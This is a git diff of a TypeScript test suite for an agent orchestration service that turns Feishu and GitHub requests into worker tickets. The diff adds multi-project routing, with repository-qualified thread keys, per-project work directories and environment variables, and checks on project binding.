@@ -24,7 +24,7 @@ import { feishuKind } from '../src/sources/feishu.ts'
 import { CliError, Commands } from '../src/infra/commands.ts'
 import { UserError, key, runningAssignment, said, threadKey, waitsForPerson, type Trigger } from '../src/core/index.ts'
 import { feishuChannel } from '../src/sources/feishu-trigger.ts'
-import { commentTrigger, githubChannel } from '../src/sources/github-trigger.ts'
+import { commentTrigger, githubChannel, issueTrigger } from '../src/sources/github-trigger.ts'
 import { IM_WORDS } from '../src/infra/text.ts'
 import { observePull, pullOf } from '../src/sources/github-pull.ts'
 import { credentialHelper, workerGitConfig } from '../src/infra/environment.ts'
@@ -44,14 +44,19 @@ const sessionIdOf = (spec: LaunchSpec): string => spec.env.OMP_SUPERAGENT_SESSIO
 const relays = (sessionId: string) => deliveries.filter(call => call.sessionId === sessionId).map(call => {
   try { return JSON.parse(call.text) as Record<string, unknown> } catch { return { text: call.text } as Record<string, unknown> }
 })
-/** A launched fake session by Superagent session id (such as `main` or `worker-<ticket>`). */
+/** A launched fake session by Superagent session id (such as `main` or `worker-<ticket>`); the latest launch wins after a restart. */
 const session = (id: string) => {
-  const found = launcher.sessions.find(candidate => sessionIdOf(candidate.spec) === id)
+  const found = launcher.sessions.findLast(candidate => sessionIdOf(candidate.spec) === id)
   if (!found) throw new Error(`Session ${id} has not launched`)
   return found
 }
 const MEMBER = 'ou_alice'
 const CHAT = 'oc_team'
+/** Two projects for binding tests: a owns the widgets repository and the team chat, b the gadgets repository and its own chat. */
+const PROJECT_AB = [
+  { id: 'a', name: 'A', repository: 'acme/widgets', chats: [{ chatId: CHAT }] },
+  { id: 'b', name: 'B', repository: 'acme/gadgets', chats: [{ chatId: 'oc_bteam' }] },
+]
 function feishu(id: string, text: string, overrides: Record<string, unknown> = {}): Trigger {
   return feishuTrigger({ message_id: `om_${id}`, chat_id: CHAT, chat_type: 'group', sender_id: MEMBER, sender_type: 'user', content: text, create_time: String(Date.parse('2026-09-09T00:00:00Z') + Number(id.replace(/\D/g, '') || 0) * 1000), mentions: [{ id: 'ou_bot' }], ...overrides }, 'ou_bot', 'cli_bot')!
 }
@@ -99,12 +104,13 @@ const roleOf = (cli: string): string => cli === AGENT ? 'agent' : cli === OTHER 
 /** Rewrite one canned probe answer; `name` is the probe's argv joined by spaces. */
 const answer = (cli: string, name: string, text: string): void => { writeFileSync(canned.get(`${roleOf(cli)}:${name}`)!, text) }
 /** Source account overrides for test setup; `feishu: null` disables the Feishu source. */
-interface Accounts { github?: Record<string, unknown>; feishu?: Record<string, unknown> | null }
+interface Accounts { github?: Record<string, unknown>; feishu?: Record<string, unknown> | null; projects?: Record<string, unknown>[] }
 function seed(store: Store, accounts: Accounts = {}): void {
   const settings = store.settings()
   const { feishu: _feishu, ...others } = settings.sources
   const feishu = accounts.feishu === null ? undefined : { ...settings.sources.feishu?.config, cli: BOT, ...accounts.feishu }
-  store.saveSettings(SettingsSchema.parse({ ...settings, sources: { ...others, github: { enabled: true, config: { repository: 'acme/widgets', cli: AGENT, ...accounts.github } }, ...feishu ? { feishu: { enabled: true, config: feishu } } : {} } }))
+  const projects = accounts.projects ?? [{ id: 'widgets', name: 'Widgets', repository: 'acme/widgets', chats: [{ chatId: CHAT }] }]
+  store.saveSettings(SettingsSchema.parse({ ...settings, projects, sources: { ...others, github: { enabled: true, config: { cli: AGENT, ...accounts.github } }, ...feishu ? { feishu: { enabled: true, config: feishu } } : {} } }))
 }
 let restarts: ReturnType<typeof vi.fn<() => void>>
 let ompBin = ''
@@ -116,7 +122,7 @@ async function restart(machine: Partial<Machine> = {}, accounts: Accounts = {}):
   return runtime
 }
 const logger = { info: (_message: string) => {}, warn: (_message: string) => {}, error: (_message: string) => {} }
-const viewsOf = (value: Runtime) => ({ store: value.store, sources: value.sources, links: value.links() })
+const viewsOf = (value: Runtime) => ({ store: value.store, sources: value.sources, links: value.links(), deployment: value.configured() ? value.deployment : undefined })
 const overviewOf = (value: Runtime) => overview(viewsOf(value), value.health, policyVersion(value.store.settings()), executorLoad(value.store, value.executor.activeCount()), value.setupProblem ?? value.feishuProblem)
 async function api(method: string, path: string, json?: unknown): Promise<{ status: number; body: unknown }> {
   let status = 0, text = ''
@@ -169,7 +175,7 @@ beforeEach(async () => {
     chmodSync(path, 0o755)
   }
   const access = '{"name":"acme/widgets","push":true}\n'
-  script(AGENT, 'agent', ['api user', '{"login":"agent-bot","id":7}'], ['api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}', access])
+  script(AGENT, 'agent', ['api user', '{"login":"agent-bot","id":7}'], ['api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}', access], ['api repos/acme/gadgets --jq {name: .full_name, push: .permissions.push}', '{"name":"acme/gadgets","push":true}\n'])
   script(OTHER, 'other', ['api user', '{"login":"agent-bot","id":7}'], ['api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}', access])
   script(BOT, 'bot', ['auth status', '{"appId":"cli_bot","brand":"feishu","identities":{"bot":{"status":"ready"}}}'],
     ['config strict-mode', 'strict-mode: bot (source: profile)'],
@@ -184,7 +190,7 @@ beforeEach(async () => {
   const store = new Store(join(directory, 'superagent.sqlite')); seed(store); store.close()
   runtime = new Runtime({ machine: testMachine({ stateDir: directory }), ompBin, launcher, logger, restart: restarts })
   await runtime.ready
-  runtime.store.saveSettings({ ...runtime.store.settings(), policy: { ...runtime.store.settings().policy, sources: { feishu: { allowed: [{ id: MEMBER, name: 'Alice' }], syncChat: CHAT }, github: { allowed: [{ id: 'alice' }] } } }, eval: { ...runtime.store.settings().eval, mode: 'auto' }, sources: { github: { enabled: true, config: { repository: 'acme/widgets', cli: AGENT } }, feishu: { enabled: true, config: { cli: BOT, chats: [{ chatId: CHAT, listen: 'all' }], directMessages: true } } } })
+  runtime.store.saveSettings({ ...runtime.store.settings(), policy: { ...runtime.store.settings().policy, sources: { feishu: { allowed: [{ id: MEMBER, name: 'Alice' }], syncChat: CHAT }, github: { allowed: [{ id: 'alice' }] } } }, eval: { ...runtime.store.settings().eval, mode: 'auto' }, sources: { github: { enabled: true, config: { cli: AGENT } }, feishu: { enabled: true, config: { cli: BOT, chats: [{ chatId: CHAT, listen: 'all' }], directMessages: true } } } })
   deliveries.length = 0
 })
 afterEach(async () => { await runtime?.stop(); vi.restoreAllMocks(); rmSync(directory, { recursive: true, force: true }) })
@@ -196,9 +202,9 @@ it('relays an explicit member mention as a candidate and creates the ticket, ack
   expect(ticket).toMatchObject({ title: '修复回归', mandate: { strength: 'explicit', basis: expect.objectContaining({ via: 'addressed', source: 'feishu', sender: 'Alice', addressed: 'mention', scope: expect.objectContaining({ chatId: CHAT }) }) },
     execution: expect.objectContaining({ name: expect.stringMatching(/^fix-regression-/) }), origin: expect.objectContaining({ triggerId: trigger.id }) })
   expect(ticket).not.toHaveProperty('ended')
-  // The ticket's execution environment is fixed at accept time: its directory under the execution root, and the Sources' values from its Trigger.
-  expect(ticket.execution!.directory).toBe(join(directory, 'work', ticket.execution!.name))
-  expect(Object.fromEntries(runtime.ticketEnvironment(ticket).map(variable => [variable.key, variable.value]))).toMatchObject({ OMP_SUPERAGENT_DIR: ticket.execution!.directory, OMP_SUPERAGENT_NAME: ticket.execution!.name, OMP_SUPERAGENT_TICKET: ticket.id, OMP_SUPERAGENT_FEISHU_CHAT: CHAT, OMP_SUPERAGENT_GITHUB_REPOSITORY: 'acme/widgets', OMP_SUPERAGENT_GITHUB_ACCOUNT: 'agent-bot', OMP_SUPERAGENT_GITHUB_NUMBER: '' })
+  // The ticket's execution environment is fixed at accept time: its directory under the project work root, and the Sources' values from its Trigger.
+  expect(ticket.execution!.directory).toBe(join(directory, 'work', 'widgets', ticket.execution!.name))
+  expect(Object.fromEntries(runtime.ticketEnvironment(ticket).map(variable => [variable.key, variable.value]))).toMatchObject({ OMP_SUPERAGENT_DIR: ticket.execution!.directory, OMP_SUPERAGENT_NAME: ticket.execution!.name, OMP_SUPERAGENT_TICKET: ticket.id, OMP_SUPERAGENT_PROJECT: 'widgets', OMP_SUPERAGENT_FEISHU_CHAT: CHAT, OMP_SUPERAGENT_GITHUB_REPOSITORY: 'acme/widgets', OMP_SUPERAGENT_GITHUB_ACCOUNT: 'agent-bot', OMP_SUPERAGENT_GITHUB_NUMBER: '' })
   expect(ticket.assignments).toEqual([expect.objectContaining({ state: 'running', startedAt: expect.any(String) })])
   expect(sessionId).toBe(`worker-${ticket.id}`)
   expect(runtime.store.threads.get(`feishu:${CHAT}:om_1`)?.subscriptions).toEqual([ticket.id])
@@ -303,37 +309,37 @@ it('records worker reports, binds the task PR, ends the ticket on ready without 
   expect(await runTool(runtime.masterId, 'orchestrator_reply', { ticket_id: ticket.id, purpose: 'attention', human_action: 'Desktop too?', text: '要不要也改桌面端？' })).toEqual({ status: 'sent' })
   await runTool(sessionId, 'orchestrator_report', { state: 'progress', summary: 'pr open', pr_number: 42, human_action: null })
   const bound = runtime.store.tickets.get(ticket.id)!
-  expect(pullOf(bound)).toBe(42)
+  expect(pullOf(bound)).toEqual({ repository: 'acme/widgets', number: 42 })
   expect(bound.attention).toBeUndefined()
-  expect(runtime.store.threads.get('github:42')?.subscriptions).toEqual([ticket.id])
+  expect(runtime.store.threads.get('github:acme/widgets#42')?.subscriptions).toEqual([ticket.id])
   await runTool(sessionId, 'orchestrator_report', { state: 'ready', summary: 'reviewed' })
   expect(runtime.store.tickets.get(ticket.id)!.ended).toBeUndefined()
   expect(relays(runtime.masterId).at(-1)).toMatchObject({ kind: 'worker_report', state: 'ready' })
   expect(await runTool(runtime.masterId, 'orchestrator_reply', { ticket_id: ticket.id, purpose: 'result', text: '已提交 PR #42，待 review。' })).toEqual({ status: 'sent' })
   const mergedAt = new Date().toISOString()
-  const merged = { number: 42, state: 'closed', merged: true, merged_at: mergedAt, html_url: 'https://github.com/acme/widgets/pull/42',
+  const merged = { repository: 'acme/widgets', number: 42, state: 'closed', merged: true, merged_at: mergedAt, html_url: 'https://github.com/acme/widgets/pull/42',
     user: { login: 'agent-bot' }, head: { sha: 'abc', ref: 'agent/x', repo: { full_name: 'acme/widgets' } } }
-  await observePull(runtime.context(githubKind), merged)
+  await observePull(runtime.context(githubKind), merged as never)
   const ended = runtime.store.tickets.get(ticket.id)!
   expect(ended).toMatchObject({ ended: expect.objectContaining({ by: 'executor', outcome: 'merged' }) })
   // The ended ticket keeps its Subscription to the PR, so a later human comment there resumes it.
-  expect(runtime.store.threads.get('github:42')?.subscriptions).toEqual([ticket.id])
+  expect(runtime.store.threads.get('github:acme/widgets#42')?.subscriptions).toEqual([ticket.id])
   // Its worker's last word was its ready report, so its session closes without interrupting the turn.
   await vi.waitFor(() => expect(runtime.sessions.state(sessionId)).toBe('absent'))
   expect(session(sessionId).commands).not.toContainEqual(expect.objectContaining({ type: 'abort' }))
   const notice = runtime.store.receipts.waiting().find(item => item.kind === 'notice')
-  expect(notice ?? runtime.store.replyStatus(key('pr-terminal', '42', 'feishu', JSON.stringify({ chatId: CHAT, messageId: 'om_1' }), 'merged'))).toBeTruthy()
+  expect(notice ?? runtime.store.replyStatus(key('pr-terminal', 'acme/widgets', '42', 'feishu', JSON.stringify({ chatId: CHAT, messageId: 'om_1' }), 'merged'))).toBeTruthy()
 })
 
 it('lists each ticket with the Threads it subscribes to, as their Sources describe them', async () => {
   const { sessionId, ticket } = await acceptedTicket()
   await runTool(sessionId, 'orchestrator_report', { state: 'progress', summary: 'pr open', pr_number: 42 })
   const line = () => ticketList(viewsOf(runtime), 'working', 0, 20).items.find(item => item.id === ticket.id)!
-  runtime.store.threads.describe('github:42', { label: '#42 Fix the margin', facts: { number: { value: '#42' }, ci: { label: 'CI', value: { zh: '通过', en: 'passed' } } } })
+  runtime.store.threads.describe('github:acme/widgets#42', { label: '#42 Fix the margin', facts: { number: { value: '#42' }, ci: { label: 'CI', value: { zh: '通过', en: 'passed' } } } })
   expect(line()).not.toHaveProperty('prNumber')
-  expect(line().threads).toContainEqual(expect.objectContaining({ key: 'github:42', source: 'github', title: '#42 Fix the margin', facts: { number: { value: '#42' }, ci: { label: 'CI', value: { zh: '通过', en: 'passed' } } } }))
-  runtime.store.threads.describe('github:42', { facts: { ci: null } })
-  expect(line().threads.find(thread => thread.key === 'github:42')!.facts).toEqual({ number: { value: '#42' } })
+  expect(line().threads).toContainEqual(expect.objectContaining({ key: 'github:acme/widgets#42', source: 'github', title: '#42 Fix the margin', facts: { number: { value: '#42' }, ci: { label: 'CI', value: { zh: '通过', en: 'passed' } } } }))
+  runtime.store.threads.describe('github:acme/widgets#42', { facts: { ci: null } })
+  expect(line().threads.find(thread => thread.key === 'github:acme/widgets#42')!.facts).toEqual({ number: { value: '#42' } })
 })
 
 it('shows a message that carries JSON, with or without a label, as its label and values on lines', () => {
@@ -430,20 +436,59 @@ it('acknowledges a follow-up from the worker once and rejects events outside the
 })
 
 it('treats GitHub comments through the same gate: mentions by members are explicit, others need an existing task', async () => {
-  const stranger = commentTrigger({ id: 1, body: 'looks wrong', user: { login: 'someone' }, html_url: 'https://github.com/acme/widgets/pull/7#issuecomment-1', created_at: '2026-09-09T00:00:00Z' }, { number: 7, isPr: true }, 'conversation', 'agent-bot')
+  const stranger = commentTrigger('acme/widgets', { id: 1, body: 'looks wrong', user: { login: 'someone' }, html_url: 'https://github.com/acme/widgets/pull/7#issuecomment-1', created_at: '2026-09-09T00:00:00Z' }, { repository: 'acme/widgets', number: 7, isPr: true }, 'conversation', 'agent-bot')
   await receive(stranger)
-  expect(runtime.store.decisions.byThread('github:7')).toEqual([expect.objectContaining({ kind: 'ignore', reason: [expect.objectContaining({ code: 'not_a_member' })] })])
-  const mention = commentTrigger({ id: 2, body: '@agent-bot please fix', user: { login: 'alice' }, html_url: 'https://github.com/acme/widgets/pull/7#issuecomment-2', created_at: '2026-09-09T00:01:00Z' }, { number: 7, isPr: true }, 'conversation', 'agent-bot')
+  expect(runtime.store.decisions.byThread('github:acme/widgets#7')).toEqual([expect.objectContaining({ kind: 'ignore', reason: [expect.objectContaining({ code: 'not_a_member' })] })])
+  const mention = commentTrigger('acme/widgets', { id: 2, body: '@agent-bot please fix', user: { login: 'alice' }, html_url: 'https://github.com/acme/widgets/pull/7#issuecomment-2', created_at: '2026-09-09T00:01:00Z' }, { repository: 'acme/widgets', number: 7, isPr: true }, 'conversation', 'agent-bot')
   await receive(mention)
   expect(relays(runtime.masterId).at(-1)).toMatchObject({ kind: 'candidate', strength: 'explicit', trigger_id: mention.id })
   const result = await route({ kind: 'accept', trigger_id: mention.id, title: 'Fix PR 7', worktree_name: 'fix-pr', acknowledgement: 'On it: fixing the review finding.' })
   const ticket = runtime.store.tickets.get((result.ticket as { ticket_id: string }).ticket_id)!
   expect(ticket.channels).toEqual([expect.objectContaining({ source: 'github', address: expect.objectContaining({ number: '7' }) })])
   // The PR's head is a variable of the ticket's execution environment; a prepare command may fetch it.
-  expect(Object.fromEntries(runtime.ticketEnvironment(ticket).map(variable => [variable.key, variable.value]))).toMatchObject({ OMP_SUPERAGENT_GITHUB_NUMBER: '7', OMP_SUPERAGENT_GITHUB_PR_HEAD: 'refs/pull/7/head', OMP_SUPERAGENT_FEISHU_CHAT: '' })
+  expect(Object.fromEntries(runtime.ticketEnvironment(ticket).map(variable => [variable.key, variable.value]))).toMatchObject({ OMP_SUPERAGENT_PROJECT: 'widgets', OMP_SUPERAGENT_GITHUB_REPOSITORY: 'acme/widgets', OMP_SUPERAGENT_GITHUB_NUMBER: '7', OMP_SUPERAGENT_GITHUB_PR_HEAD: 'refs/pull/7/head', OMP_SUPERAGENT_FEISHU_CHAT: '' })
   const ci = { ...stranger, id: 'ci-1', human: false, text: 'GitHub PR #7 CI: failing', meta: { ci: true } }
   await receive(ci)
   expect(runtime.store.tickets.get(ticket.id)!.inputs).toEqual([expect.objectContaining({ triggerId: 'ci-1' })])
+})
+
+it('accepts an explicit request on project b\'s repository into b\'s work root with b\'s environment', async () => {
+  await restart({}, { projects: PROJECT_AB })
+  const issue = { number: 12, title: 'Login fails', body: '@agent-bot please fix the login',
+    created_at: '2026-09-09T00:00:00Z', html_url: 'https://github.com/acme/gadgets/issues/12', user: { login: 'alice', type: 'User' } }
+  const trigger = issueTrigger('acme/gadgets', issue, 'agent-bot')
+  await receive(trigger)
+  expect(relays(runtime.masterId).at(-1)).toMatchObject({ kind: 'candidate', strength: 'explicit', trigger_id: trigger.id })
+  const result = await route({ kind: 'accept', trigger_id: trigger.id, title: 'Fix login', worktree_name: 'fix-login', acknowledgement: 'On it: fixing the login.' })
+  const ticket = runtime.store.tickets.get((result.ticket as { ticket_id: string }).ticket_id)!
+  expect(ticket.execution!.project).toBe('b')
+  expect(ticket.execution!.directory).toBe(join(directory, 'work', 'b', ticket.execution!.name))
+  expect(Object.fromEntries(runtime.ticketEnvironment(ticket).map(variable => [variable.key, variable.value]))).toMatchObject({ OMP_SUPERAGENT_PROJECT: 'b', OMP_SUPERAGENT_GITHUB_REPOSITORY: 'acme/gadgets', OMP_SUPERAGENT_GITHUB_NUMBER: '12' })
+})
+
+it('accepts an explicit request in project b\'s Feishu chat into b\'s work root with b\'s environment', async () => {
+  await restart({}, { projects: PROJECT_AB })
+  const settings = runtime.store.settings()
+  const feishuSource = settings.sources.feishu!
+  runtime.store.saveSettings({ ...settings, sources: { ...settings.sources,
+    feishu: { ...feishuSource, config: { ...feishuSource.config, chats: [{ chatId: CHAT, listen: 'all' }, { chatId: 'oc_bteam', listen: 'all' }] } } } })
+  const trigger = feishu('60', '@bot 修一下小工具', { chat_id: 'oc_bteam' })
+  await receive(trigger)
+  expect(relays(runtime.masterId).at(-1)).toMatchObject({ kind: 'candidate', strength: 'explicit', trigger_id: trigger.id })
+  const result = await route({ kind: 'accept', trigger_id: trigger.id, title: '修复小工具', worktree_name: 'fix-gadget', acknowledgement: '收到，修复小工具。' })
+  const ticket = runtime.store.tickets.get((result.ticket as { ticket_id: string }).ticket_id)!
+  expect(ticket.execution!.project).toBe('b')
+  expect(ticket.execution!.directory).toBe(join(directory, 'work', 'b', ticket.execution!.name))
+  expect(Object.fromEntries(runtime.ticketEnvironment(ticket).map(variable => [variable.key, variable.value]))).toMatchObject({ OMP_SUPERAGENT_PROJECT: 'b', OMP_SUPERAGENT_GITHUB_REPOSITORY: 'acme/gadgets', OMP_SUPERAGENT_FEISHU_CHAT: 'oc_bteam' })
+})
+
+it('refuses a direct message that names no project when two projects are configured', async () => {
+  await restart({}, { projects: PROJECT_AB })
+  const dm = feishu('61', '修一下回归', { chat_id: 'oc_dm1', chat_type: 'p2p', mentions: [] })
+  await receive(dm)
+  expect(relays(runtime.masterId).at(-1)).toMatchObject({ kind: 'candidate', strength: 'explicit', trigger_id: dm.id })
+  await expect(route({ kind: 'accept', trigger_id: dm.id, title: 'Fix', worktree_name: 'fix-dm', acknowledgement: 'On it.' }))
+    .rejects.toThrow('Projects: a, b')
 })
 
 it('relays an allowed sender\'s mention in a new Issue as an explicit candidate from the poll that reads its notification', async () => {
@@ -458,7 +503,7 @@ it('relays an allowed sender\'s mention in a new Issue as an explicit candidate 
   await pollRound(runtime.context(githubKind))
   await runtime.idle()
   const candidate = relays(runtime.masterId).at(-1)
-  expect(candidate).toMatchObject({ kind: 'candidate', strength: 'explicit', trigger_id: key('github-issue', '12'), thread: 'github:12' })
+  expect(candidate).toMatchObject({ kind: 'candidate', strength: 'explicit', trigger_id: key('github-issue', 'acme/widgets', '12'), thread: 'github:acme/widgets#12' })
 })
 
 it('ignores an allowed sender\'s new Issue that does not mention the agent, and an unlisted sender\'s mention, from the poll that reads them', async () => {
@@ -473,25 +518,25 @@ it('ignores an allowed sender\'s new Issue that does not mention the agent, and 
     await pollRound(runtime.context(githubKind))
     await runtime.idle()
   await runtime.idle()
-    return key('github-issue', String(number))
+    return key('github-issue', 'acme/widgets', String(number))
   }
   const quiet = await poll(12, 'The login page fails after the update', 'alice')
-  expect(runtime.store.decisions.byThread('github:12')).toEqual([expect.objectContaining({ kind: 'ignore', reason: [{ code: 'no_mention', triggerId: quiet }] })])
+  expect(runtime.store.decisions.byThread('github:acme/widgets#12')).toEqual([expect.objectContaining({ kind: 'ignore', reason: [{ code: 'no_mention', triggerId: quiet }] })])
   const stranger = await poll(13, '@agent-bot please fix the login', 'mallory')
-  expect(runtime.store.decisions.byThread('github:13')).toEqual([expect.objectContaining({ kind: 'ignore', reason: [{ code: 'not_a_member', triggerId: stranger }] })])
+  expect(runtime.store.decisions.byThread('github:acme/widgets#13')).toEqual([expect.objectContaining({ kind: 'ignore', reason: [{ code: 'not_a_member', triggerId: stranger }] })])
   expect(relays(runtime.masterId).filter(item => item.kind === 'candidate')).toEqual([])
 })
 
 it('keeps Issue Triggers stored before Issues arrived through notifications readable on their Thread', async () => {
-  const stored: Trigger = { id: key('github-issue', '5'), source: 'github-issue', threads: [{ source: 'github', id: '5' }],
+  const stored: Trigger = { id: key('github-issue', 'acme/widgets', '5'), source: 'github-issue', threads: [{ source: 'github', id: 'acme/widgets#5' }],
     actor: { source: 'github', id: 'alice' }, human: true, at: '2026-09-01T00:00:00Z', text: 'Bug\n\ndetails',
-    url: 'https://github.com/acme/widgets/issues/5', meta: { number: 5, isPr: false, eligibleAt: '2026-09-02T00:00:00.000Z' } }
+    url: 'https://github.com/acme/widgets/issues/5', meta: { repository: 'acme/widgets', number: 5, isPr: false, eligibleAt: '2026-09-02T00:00:00.000Z' } }
   runtime.store.triggers.save(stored)
-  runtime.store.threads.save({ key: 'github:5', ref: { source: 'github', id: '5' }, createdAt: stored.at, subscriptions: [], correlated: [],
+  runtime.store.threads.save({ key: 'github:acme/widgets#5', ref: { source: 'github', id: 'acme/widgets#5' }, createdAt: stored.at, subscriptions: [], correlated: [],
     pending: [], meta: {} })
   const read = await runTool(runtime.masterId, 'orchestrator_read', { resource: `trigger/${stored.id}` })
   expect(read).toMatchObject({ trigger_id: stored.id, source: 'github-issue', text: 'Bug\n\ndetails' })
-  const thread = (await api('GET', 'threads/github:5')).body
+  const thread = (await api('GET', `threads/${encodeURIComponent('github:acme/widgets#5')}`)).body
   expect(thread).toMatchObject({ timeline: [expect.objectContaining({ id: stored.id, source: 'github-issue' })] })
 })
 
@@ -552,8 +597,8 @@ it('lets an Executor drop only its own ticket from a thread it finds unrelated, 
     && call.text.includes('thread_unrelated'))).toBe(true))
   await expect(runTool(sessionId, 'orchestrator_thread_unrelated', { thread: 'feishu:oc_side:om_side', reason: 'again' })).rejects.toThrow('does not follow that thread')
   await expect(runTool(sessionId, 'orchestrator_thread_unrelated', { thread: threadKey(trigger.threads[0]!), reason: 'no' })).rejects.toThrow('the ticket started on')
-  runtime.engine.bindThread(ticket.id, { source: 'github', id: '7' }, true)
-  await expect(runTool(sessionId, 'orchestrator_thread_unrelated', { thread: 'github:7', reason: 'no' })).rejects.toThrow('pull request')
+  runtime.engine.bindThread(ticket.id, { source: 'github', id: 'acme/widgets#7' }, true)
+  await expect(runTool(sessionId, 'orchestrator_thread_unrelated', { thread: 'github:acme/widgets#7', reason: 'no' })).rejects.toThrow('pull request')
   // A worker drops only its own ticket: the other ticket's thread is not one this ticket follows.
   await expect(runTool(sessionId, 'orchestrator_thread_unrelated', { thread: threadKey(other.trigger.threads[0]!), reason: 'no' })).rejects.toThrow('does not follow that thread')
 })
@@ -699,7 +744,7 @@ it('links Channels and Threads for people, finds tickets by a bare PR number, an
   expect(ticketDetail(viewsOf(runtime), ticket.id)!.channels).toEqual([expect.objectContaining({ source: 'feishu', url: chatLink })])
   expect(threadDetail(viewsOf(runtime), home, undefined, 10)!.url).toBe(chatLink)
   // A pull request the Ticket opened is a Thread it follows as its own.
-  runtime.store.tickets.save({ ...runtime.store.tickets.get(ticket.id)!, follows: [{ thread: 'github:4996', own: true }] })
+  runtime.store.tickets.save({ ...runtime.store.tickets.get(ticket.id)!, follows: [{ thread: 'github:acme/widgets#4996', own: true }] })
   expect(search(viewsOf(runtime), '4996', new TextCache(0)).tickets).toEqual([expect.objectContaining({ id: ticket.id })])
   expect(threadList(viewsOf(runtime), 'subscribed', 0, 10).items.map(thread => thread.key)).toEqual([home])
   runtime.engine.stopTicket(ticket.id)
@@ -720,19 +765,19 @@ it('counts every step of the day\'s flow over the same arriving messages and lis
 })
 
 it('queues a requeued trigger visibly and tells the orchestrator', async () => {
-  const stranger = commentTrigger({ id: 3, body: 'looks wrong', user: { login: 'someone' }, html_url: 'https://github.com/acme/widgets/pull/8#issuecomment-3', created_at: '2026-09-09T00:00:00Z' }, { number: 8, isPr: true }, 'conversation', 'agent-bot')
+  const stranger = commentTrigger('acme/widgets', { id: 3, body: 'looks wrong', user: { login: 'someone' }, html_url: 'https://github.com/acme/widgets/pull/8#issuecomment-3', created_at: '2026-09-09T00:00:00Z' }, { repository: 'acme/widgets', number: 8, isPr: true }, 'conversation', 'agent-bot')
   await receive(stranger)
   runtime.store.saveSettings({ ...runtime.store.settings(), paused: true })
   expect(runtime.engine.reevaluate(stranger.id)).toBe(true)
-  expect(threadDetail(viewsOf(runtime), 'github:8', undefined, 50)!.timeline[0]!.disposition).toMatchObject({ queued: true })
+  expect(threadDetail(viewsOf(runtime), 'github:acme/widgets#8', undefined, 50)!.timeline[0]!.disposition).toMatchObject({ queued: true })
   await vi.waitFor(() => expect(deliveries.some(call => call.sessionId === runtime.masterId && call.mode === 'inject'
     && call.text.includes('trigger_requeued'))).toBe(true))
 })
 
 it('asks a question where the human message that raised it was written, not in the ticket\'s original conversation', async () => {
   const { ticket, trigger, sessionId } = await acceptedTicket()
-  subscribe(ticket.id, { source: 'github', id: '42' })
-  const review = commentTrigger({ id: 5, body: 'Can you add the reason?', user: { login: 'alice' }, html_url: 'https://github.com/acme/widgets/pull/42#pullrequestreview-5', created_at: '2026-09-09T00:02:00Z' }, { number: 42, isPr: true }, 'review', 'agent-bot')
+  subscribe(ticket.id, { source: 'github', id: 'acme/widgets#42' })
+  const review = commentTrigger('acme/widgets', { id: 5, body: 'Can you add the reason?', user: { login: 'alice' }, html_url: 'https://github.com/acme/widgets/pull/42#pullrequestreview-5', created_at: '2026-09-09T00:02:00Z' }, { repository: 'acme/widgets', number: 42, isPr: true }, 'review', 'agent-bot')
   await receive(review)
   await expect(runTool(sessionId, 'orchestrator_report', { state: 'progress', summary: 'x', question_for_trigger_id: review.id })).rejects.toThrow('needs the question it raised')
   await expect(runTool(sessionId, 'orchestrator_report', { state: 'progress', summary: 'x', human_action: 'Keep it?', question_for_trigger_id: 'unknown' })).rejects.toThrow('the person\'s message that raised it')
@@ -747,9 +792,9 @@ it('asks a question where the human message that raised it was written, not in t
 })
 
 it('finds triggers by #PR number, GitHub link prefix and Feishu message id', async () => {
-  const comment = commentTrigger({ id: 4, body: 'please check', user: { login: 'alice' }, html_url: 'https://github.com/acme/widgets/pull/9#issuecomment-4', created_at: '2026-09-09T00:00:00Z' }, { number: 9, isPr: true }, 'conversation', 'agent-bot')
+  const comment = commentTrigger('acme/widgets', { id: 4, body: 'please check', user: { login: 'alice' }, html_url: 'https://github.com/acme/widgets/pull/9#issuecomment-4', created_at: '2026-09-09T00:00:00Z' }, { repository: 'acme/widgets', number: 9, isPr: true }, 'conversation', 'agent-bot')
   await receive(comment)
-  expect(search(viewsOf(runtime), '#9', new TextCache(0)).threads).toEqual([expect.objectContaining({ key: 'github:9' })])
+  expect(search(viewsOf(runtime), '#9', new TextCache(0)).threads).toEqual([expect.objectContaining({ key: 'github:acme/widgets#9' })])
   expect(search(viewsOf(runtime), 'https://github.com/acme/widgets/pull/9', new TextCache(0)).items.map(item => item.id)).toContain(comment.id)
   const message = feishu('30', '随便说说', { mentions: [] })
   await receive(message)
@@ -825,7 +870,7 @@ it('reports each setup problem where the operator fixes it, and checks the agent
     expect(next.setupProblem).toMatchObject({ place, code, values })
   }
   answer(AGENT, 'api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}', '{"name":"acme/widgets","push":false}\n')
-  await needs('github', 'repositoryReadOnly', { account: 'agent-bot', repository: 'acme/widgets' })
+  await needs('projects', 'repositoryReadOnly', { project: 'widgets', account: 'agent-bot', repository: 'acme/widgets' })
   answer(AGENT, 'api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}', '{"name":"acme/widgets","push":true}\n')
   // The agent CLI runs in the workers' environment: without the shims on PATH.
   const probed = await workerProbe(directory, directory, new AbortController().signal)(['sh', '-c', 'echo "$PATH"'])
@@ -840,7 +885,7 @@ it('reports each setup problem where the operator fixes it, and checks the agent
   const savedPath = process.env.PATH
   process.env.PATH = `${shimDir}:${savedPath ?? ''}`
   try { await needs('deployment', 'gitTooOld', {}) } finally { process.env.PATH = savedPath }
-  await needs('github', 'repositoryUnset', {}, { github: { repository: '' } })
+  await needs('projects', 'projectsUnset', {}, { projects: [] })
   // A broken Feishu bot leaves Feishu out and says why; GitHub work goes on.
   answer(BOT, 'config strict-mode', 'strict-mode: off (source: profile)')
   const next = await restart()
@@ -875,14 +920,24 @@ it('checks only the account a Source save changes, so a problem setup has elsewh
     .toMatchObject({ saved: true, restarting: true })
 })
 
-it('lets only the panel change the execution environment, since it decides what runs as a shell command and which CLIs workers reach', async () => {
-  const executor = () => runtime.store.settings().executor
-  const save = (value: Record<string, unknown>, origin: SettingsOrigin) => runtime.settings.save('executor', { ...executor(), ...value }, runtime.store.blockRevision('executor'), origin)
+it('lets only the panel change projects and blocked commands, since they decide what runs as a shell command and which CLIs workers reach', async () => {
+  const projects = () => runtime.store.settings().projects
+  const saveProjects = (value: unknown, origin: SettingsOrigin) =>
+    runtime.settings.save('projects', value, runtime.store.blockRevision('projects'), origin)
   for (const origin of ['tool', 'sync'] as const) {
